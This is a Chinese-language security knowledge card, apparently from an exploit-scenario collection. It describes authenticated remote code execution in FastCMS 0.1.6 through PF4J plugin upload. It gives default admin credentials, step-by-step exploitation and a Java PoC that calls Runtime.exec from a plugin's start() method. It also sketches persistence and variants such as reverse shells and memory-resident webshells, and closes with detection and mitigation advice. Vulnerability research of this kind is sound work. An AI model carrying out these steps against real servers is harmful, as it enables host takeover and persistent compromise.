---
id: web-java-component-fastcms-plugin-upload-pf4j-start-rce
title: FastCMS 0.1.6 后台插件上传 RCE：PF4J 加载插件并调用 start() 执行任意 Java 代码
type: scenario
domain: web
path: web/java/component
technique: pf4j-plugin-upload-code-execution
aliases:
- FastCMS 插件系统 RCE
- FastCMS 插件上传 RCE
- PF4J 插件 RCE
- plugin:install 上传 jar
- HelloPlugin 代码执行
- 后台插件 getshell
tags:
- java
- fastcms
- pf4j
- plugin
- file-upload
- rce
- authenticated
- persistence
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:02:26+08:00'
  notes: 已对照原文与20张图核对：PluginController.install 的 @Secured(plugin:install,WRITE)、开发环境拒绝、仅 .jar/.zip 后缀、installPlugin→loadPlugin→loadPluginFromPath(PF4J)→startPlugin→plugin.start()、修改 HelloPlugin.start() 加 Runtime.exec(calc.exe)、上传后插件列表出现并弹计算器、卸载405且JAR保留，均与图11-25一致。原文仅给出目标/审计版本 FastCMS 0.1.6，未给影响区间，按 brief 已清除 affected_versions。该场景本质是后台插件安装权限即可执行任意 Java 代码，卡内已说明功能/权限边界。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

FastCMS 0.1.6 的后台插件安装接口只校验文件后缀为 `.jar`/`.zip`，随后把 JAR 交给 PF4J 加载并在安装流程中调用插件的 `start()`；具备 `plugin:install` 权限的攻击者上传一个在 `start()` 中执行命令的插件，即可让任意 Java 代码以应用进程权限运行，把后台权限升级为主机 RCE。

## 原理

- **安装入口**：`PluginController` 的 `POST install` 使用 `@Secured(resource="plugin:install", action=WRITE)`，先拒绝开发环境，再取原始文件名后缀，仅允许 `.jar`/`.zip`，保存到插件目录后调用 `pluginManagerService.installPlugin(path)`。
- **加载链**：`installPlugin()` 先 `loadPlugin(path)` 再 `startPlugin(pluginId)`。PF4J 的 `loadPluginFromPath` 通过 `PluginDescriptorFinder` 读取 `Plugin-Id`/`Plugin-Class` 等元数据，校验后创建 `PluginClassLoader`、加载插件类并 `createPluginWrapper`、`addPlugin`。
- **执行点**：`startPlugin()` 在状态检查通过后调用 `pluginWrapper.getPlugin().start()`。`start()` 是插件作者实现的普通 Java 方法，插件字节码由 PF4J 类加载器加载到同一个 JVM 中，没有沙箱、签名校验或权限隔离；因此插件代码可以直接 `Runtime.getRuntime().exec(...)`、读文件、起线程或注册路由。
- **为什么成立**：插件系统的设计目标就是“让外部代码在应用内运行”，上传的 JAR 就是可执行代码；这是功能与漏洞的边界问题——对超级管理员而言是预期能力，但在后台账号被攻陷、权限分离缺失或外包/多租户管理员不应获得主机权限时，就构成从 Web 后台到主机 RCE 的升级链。
- 插件会落在插件目录并在重启时重新加载，因此还可作为持久化手段；原文还提到卸载后 JAR 可能保留（卸载接口返回 405）。

## 触发条件

- 目标为 FastCMS 0.1.6。
- 使用生产配置（`--spring.profiles.active=prod`）：开发环境会直接拒绝插件安装。
- 攻击者拥有后台账号且具备 `plugin:install` WRITE 权限（原文使用 `admin/1`）。
- 能构建并上传 JAR，或能构造满足 PF4J 元数据要求的插件包。

## 利用步骤

1. 登录后台（原文 `http://127.0.0.1:8080/fastcms-master.html`，admin/1）。
2. 准备插件工程：`pom.xml`、`plugin.properties`、继承 `PluginBase` 的插件类；在 `start()` 中加入命令执行代码（原文直接修改官方 `hello-world-plugin` 的 `HelloPlugin.start()`）。
3. 在插件目录执行 `mvn clean package` 生成 `*-SNAPSHOT.jar`。
4. 后台“插件 → 插件管理 → 安装插件”，上传 JAR；服务端加载并激活插件，`start()` 被执行（原文弹出 `calc.exe`）。
5. 如需重复验证：停止项目删除 `.dist/plugins` 下的 JAR，或卸载后修改 JAR 包名重新上传，或修改 `pom.xml` 的 `artifactId`/`plugin.id` 重新打包。
6. 持久化：插件 JAR 留在插件目录，应用重启后会再次加载；可进一步在插件中注册路由/拦截器或写入内存马。

## PoC

```java
public class XxxPlugin extends PluginBase {
    public XxxPlugin(PluginWrapper wrapper) { super(wrapper); }

    @Override
    public void start() {
        super.start();
        try {
            Class<?> runtimeClass = Class.forName("java.lang.Runtime");
            Method getRuntime = runtimeClass.getMethod("getRuntime");
            Object runtimeObj = getRuntime.invoke(null);
            Method exec = runtimeClass.getMethod("exec", String.class);
            exec.invoke(runtimeObj, "calc.exe");
        } catch (Exception e) { }
    }
}
```

```properties
plugin.id=xxx
plugin.class=com.fastcms.xxx.XxxPlugin
```

```bash
mvn clean package
# 后台“插件管理 → 安装插件”上传 target/xxx-*-SNAPSHOT.jar
```

原文验证：上传后插件列表出现 `hello-world-plugin`，目标主机弹出计算器；卸载返回 405 且 JAR 可能残留。

## 变体与关联

- 变体：在插件 `start()` 中执行反弹 shell、写文件、注册 Spring Controller/Filter 形成内存马；利用 `.zip` 分支投递带依赖的插件包；通过插件配置页（`getConfigUrl`）暴露额外入口。
- 关联：`[[web-java-classloader-servletcontainerinitializer-spi-backdoor]]`（向 classpath 放 JAR 注册后门 Servlet，同属“加载即执行”）；`[[pentest-persistence-java-tool-options-javaagent]]`（Java Agent 持久化）；`[[web-java-deser-fastjson-file-write-to-rce]]`（任意文件写落到 JAR/classes 后加载执行）。
- 与上传解析漏洞的区别：这里不需要绕过后缀或内容检测——JAR 是合法插件格式，利用点在于“插件代码被信任并执行”的权限边界。

## 检测与防御

- 检测：`plugin:install` 上传事件与新 JAR 落盘；插件列表新增/状态变为 STARTED；应用 JVM 产生 `calc.exe`、`cmd.exe`、`bash -c`、`whoami` 等异常子进程；插件目录文件完整性变化；卸载 405 后 JAR 残留。
- 修复：将插件安装限制为超级管理员并做二次确认；对插件 JAR 做签名校验与来源白名单；生产环境不需要插件功能时禁用上传接口。
- 缓解：应用进程低权限运行；插件在独立进程/容器中加载并限制文件与网络权限；对插件目录做文件完整性监控；后台账号最小权限与操作审计。
